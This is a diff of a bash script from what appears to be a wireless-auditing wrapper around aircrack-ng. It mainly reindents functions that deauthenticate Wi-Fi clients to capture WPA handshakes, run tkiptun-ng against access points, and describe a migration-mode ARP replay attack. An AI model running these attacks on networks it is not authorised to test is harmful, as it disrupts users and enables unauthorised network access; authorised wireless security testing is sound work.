@@ -23,18 +23,18 @@ wpa_attacks(){
     hardclean && $clear 
     attack=$1; shift;
     wpa_attacks_$attack $@
-	notification="Attack launched, see window menu"
+    notification=$attack_notification
 }
 
 wpa_attacks_menu(){
-	help_fifo $"${mark}${red}WPA attacks${end}\n"\
-		"You're seeing this menu because the network you selected has WPA encryption\n"\
-		"${red}Standard deauth attack${end}\n"\
-		"Deauths a client, then waits for the client to reconnect and tries to capture the 4-way handshake\n"\
-		"${red}QOS attack${end}\n"\
-		"Launches tkiptun-ng to try to crack some vulnerable accesspoints to the wmm stuff\n"\
-		"${red}WPA Migration Mode attack${end}\n"\
-		"This attack targets on Cisco Aironet routers, wich set both WPA and WEP encriptions on the same sssid\nIt listens for a wep-encapsulated arp packet and retransmits it (bitflipped to make it into an ARP coming from the attacker's MAC)"
+    help_fifo $"${mark}${red}WPA attacks${end}\n"\
+        "You're seeing this menu because the network you selected has WPA encryption\n"\
+        "${red}Standard deauth attack${end}\n"\
+        "Deauths a client, then waits for the client to reconnect and tries to capture the 4-way handshake\n"\
+        "${red}QOS attack${end}\n"\
+        "Launches tkiptun-ng to try to crack some vulnerable accesspoints to the wmm stuff\n"\
+        "${red}WPA Migration Mode attack${end}\n"\
+        "This attack targets on Cisco Aironet routers, wich set both WPA and WEP encriptions on the same sssid\nIt listens for a wep-encapsulated arp packet and retransmits it (bitflipped to make it into an ARP coming from the attacker's MAC)"
 
     while true; do
         $clear; mkmenu $"Select WPA Attack" $"Standard attack" $"Standard attack with QoS (WMM)" $"WPA migration mode"
@@ -48,22 +48,24 @@ wpa_attacks_menu(){
 
 wpa_attacks_handshake(){
 
-	[[ $dynamic_client_selection ]] && {
-		auto_scan_clients;
-		select_client; 
-	}
+    [[ $dynamic_client_selection ]] && {
+        auto_scan_clients;
+        select_client; 
+    }
 
-	[[ $Client_MAC != ""  ]] && { directed=1; }
+    [[ $Client_MAC != ""  ]] && { directed=1; }
+    export time_=0;
     execute $"Capturing data on channel: $Host_CHAN"  $AIRODUMP --ignore-negative-one  -w $DUMP_PATH/$Host_MAC --bssid $Host_MAC --channel $Host_CHAN -a $wifi
-
-	[[ $directed == 1 ]] && choose_deauth 2
-	[[ $directed != 1 ]] && choose_deauth 3 
+    export time_=1
+    [[ $directed == 1 ]] && choose_deauth 2
+    [[ $directed != 1 ]] && choose_deauth 3 
 
 
 }
 
 wpa_attacks_qos(){
      iwconfig $wificard channel $Host_CHAN # Hope this is ok for all cards
+    export time_=0;
      execute $"Executing tkiptun-ng for ap $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $wifi
 }
 
